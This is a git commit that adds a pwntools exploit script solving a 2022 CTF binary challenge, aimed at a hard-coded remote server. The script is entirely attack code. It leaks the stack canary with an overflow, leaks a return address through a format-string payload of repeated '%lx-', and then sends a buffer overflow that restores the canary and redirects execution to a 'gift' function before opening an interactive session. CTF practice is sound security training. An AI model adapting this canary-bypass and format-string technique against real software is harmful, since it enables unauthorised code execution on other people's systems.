0c1cbfa64bfebb2541ac9c36570dda422050293a
Minjea Lee <gabe0529@naver.com>
2022-01-29 22:06:03 -0800

    s! 2022 ctf exploit remote

---
+++ 2022_S!_CTF/ex_remote.py
@@ -0,0 +1,43 @@
+from pwn import *
+
+gift_offset = 0x14a
+
+# nc 132.226.232.51 31000
+
+# p = process("./ctf")
+p = remote("132.226.232.51", 31000)
+
+canary_pay = b""
+canary_pay += b"A" * 33
+
+p.sendafter(">> ",canary_pay)
+p.recvuntil(">>")
+p.recvuntil("A" * 32)
+
+leak = p.recv(4)[1:]
+canary = u32(b"\x00" + leak)
+
+print(hex(canary))
+input()
+p.recvuntil(">> ")
+
+pay = b""
+pay += b"%lx-" * 11
+p.send(pay)
+
+p.recvuntil("-2d786c25" * 5)
+p.recv(5)
+ret_leak = u32(p.recv(4))
+gift = ret_leak - gift_offset
+
+print(hex(gift))
+
+pay2 = b""
+pay2 += b"A"*32
+pay2 += p32(canary)
+pay2 += b"B"*12
+pay2 += p32(gift)
+
+p.send(pay2)
+
+p.interactive()
